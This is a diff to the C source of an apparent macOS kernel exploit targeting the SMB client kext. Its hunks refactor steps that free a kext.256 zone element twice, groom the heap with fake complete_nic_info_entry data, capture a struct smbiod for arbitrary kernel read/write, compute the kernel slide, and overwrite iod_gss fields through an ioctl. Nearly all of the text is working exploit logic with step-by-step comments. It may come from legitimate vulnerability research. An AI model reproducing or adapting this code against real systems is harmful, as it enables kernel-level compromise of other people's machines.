@@ -130,7 +130,7 @@ void patch_smb_sessions(xe_slider_kext_t smbfs_slider) {
     uintptr_t smb_session_list = xe_slider_kext_slide(smbfs_slider, XE_KEXT_SEGMENT_DATA, VAR_SMB_SESSION_LIST_OFFSET_DATA);
     uintptr_t cursor = xe_kmem_read_uint64(smb_session_list, TYPE_SMB_CONNOBJ_MEM_CO_CHILDREN_OFFSET);
     while (cursor != 0) {
-        xe_assert(XE_VM_KERNEL_ADDRESS_VALID(cursor));
+        xe_assert(xe_vm_kernel_address_valid(cursor));
         patch_smb_session(smbfs_slider, cursor);
         cursor = xe_kmem_read_uint64(cursor, TYPE_SMB_CONNOBJ_MEM_CO_NEXT_OFFSET);
     }
@@ -184,7 +184,7 @@ int main(void) {
     /// The `kmem_zkext_alloc_small` function can be used for allocating elements of size less than or equal to `UINT8_MAX`
     /// with controlled data, with a caveat that the first 8 bytes of the allocated memory cannot be controlled. Fortunately for
     /// constructing a valid `struct complete_nic_info_entry` we don't need control over the first 8 bytes
-    struct kmem_zkext_alloc_small_entry kext_256_element = kmem_zkext_alloc_small(&smb_addr, (char*)fake_nic + 8, 256 - 8 - 1);
+    struct kmem_zkext_alloc_small_entry kext_256_element = kmem_zkext_alloc_small(&smb_addr, 255, (char*)fake_nic + 8, 255 - 8);
     xe_log_debug("allocated kext.256 element with fake complete_nic_info_entry at %p", (void*)kext_256_element.address);
     
     // STEP 1-c: Construct replacement for leaked `struct complete_nic_info_entry` with
@@ -204,8 +204,9 @@ int main(void) {
     uint num_nbpcb_rw_capture_allocations = 512;
     kmem_allocator_rw_t nbpcb_rw_capture_allocator = kmem_allocator_rw_create(&smb_addr, num_nbpcb_rw_capture_allocations / 2);
     
-    kmem_zkext_prime_util_t pre_allocator = kmem_zkext_prime_util_create(&smb_addr);
-    kmem_zkext_prime_util_prime(pre_allocator, 128, 255);
+    // TODO: check and scrub
+//    kmem_zkext_prime_util_t pre_allocator = kmem_zkext_prime_util_create(&smb_addr);
+//    kmem_zkext_prime_util_prime(pre_allocator, 128, 255);
     
     xe_log_debug("begin free of allocated kext.256 element retaining read reference");
     kmem_zkext_free_session_execute(nbpcb_free_session, &double_free_nic);
@@ -407,7 +408,7 @@ int main(void) {
     }, NULL, &found_index);
     xe_assert_err(error);
     xe_assert(found_index >= 0);
-    xe_assert(XE_VM_KERNEL_ADDRESS_VALID((uintptr_t)leaked_smbiod->iod_tdesc));
+    xe_assert(xe_vm_kernel_address_valid((uintptr_t)leaked_smbiod->iod_tdesc));
     xe_log_info("captured smbiod with tdesc %p", leaked_smbiod->iod_tdesc);
     
     // After STEP 3, we will have an element of type `struct smbiod` allocated in
@@ -443,8 +444,8 @@ int main(void) {
     xe_log_debug("captured smbiod owned by smb dev at fd: %d", *fd_smbiod);
     xe_log_info("done capturing smbiod for read write");
     
-    kmem_smbiod_rw_t smbiod_rw = kmem_smbiod_rw_create(&smb_addr, fd_smbiod_rw, *fd_smbiod);
-    xe_kmem_use_backend(xe_kmem_smbiod_create(smbiod_rw));
+    kmem_smbiod_backend_t smbiod_backend = kmem_smbiod_create(&smb_addr, fd_smbiod_rw, *fd_smbiod);
+    xe_kmem_use_backend(smbiod_backend);
     xe_log_info("kmem reader using smbiod created");
     
     // STEP 4: Calculate kernel address slide
@@ -559,10 +560,10 @@ int main(void) {
     args.helper_mutator = ^(void* ctx, char* data) {
         xe_log_debug_hexdump(data, sizeof(args.helper_data), "replacing helper msdosfsmount with data: ");
         struct smbiod iod;
-        kmem_smbiod_rw_read_iod(smbiod_rw, &iod);
+        kmem_smbiod_read_iod(smbiod_backend, &iod);
         iod.iod_gss.gss_cpn = (uint8_t*)msdosfs_helper;
         iod.iod_gss.gss_cpn_len = sizeof(backup_helper);
-        kmem_smbiod_rw_write_iod(smbiod_rw, &iod);
+        kmem_smbiod_write_iod(smbiod_backend, &iod);
         
         char any_data[32];
         int error = smb_client_ioc_ssn_setup(*fd_smbiod, any_data, sizeof(any_data), any_data, sizeof(any_data));
@@ -600,7 +601,7 @@ int main(void) {
     kmem_allocator_rw_destroy(&msdosfs_rw_capture_allocators);
     close(*fd_smbiod);
     close(fd_smbiod_rw);
-    kmem_smbiod_rw_destroy(&smbiod_rw);
+    kmem_smbiod_destroy(&smbiod_backend);
     kmem_zkext_free_session_destroy(&smbiod_free_session);
     kmem_zkext_free_session_destroy(&nbpcb_free_session);
     
